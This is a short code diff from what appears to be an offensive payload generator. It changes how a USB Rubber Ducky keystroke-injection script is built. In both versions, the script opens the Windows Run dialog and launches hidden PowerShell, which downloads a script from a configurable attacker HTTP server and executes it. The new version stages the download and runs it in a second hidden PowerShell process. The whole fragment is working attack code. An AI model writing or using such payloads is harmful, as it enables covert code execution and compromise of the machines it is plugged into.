@@ -217,7 +217,7 @@ class Generator:
     
     def encode_duckyscript(self):
         print(f"{n} encoding inject.bin . . .")
-        ducky = f"""GUI r\nDELAY 500\nSTRING powershell -w h -c "iex(new-object system.net.webclient).downloadstring('http://{self.settings.http_server_address[0]}:{str(self.settings.http_server_address[1])}/{self.settings.script_name}')"\nENTER"""
+        ducky = f"""GUI r\nDELAY 500\nSTRING powershell -w h -c "$a=(new-object system.net.webclient).downloadstring('http://{self.settings.http_server_address[0]}:{str(self.settings.http_server_address[1])}/{self.settings.script_name}'); start powershell -arg '-c', \"iex `\"$a`\"\" -wi hidden"\nENTER"""
         with open("core/payload/ducky/script.txt", "w") as f:
             f.write(ducky)
         f.close()
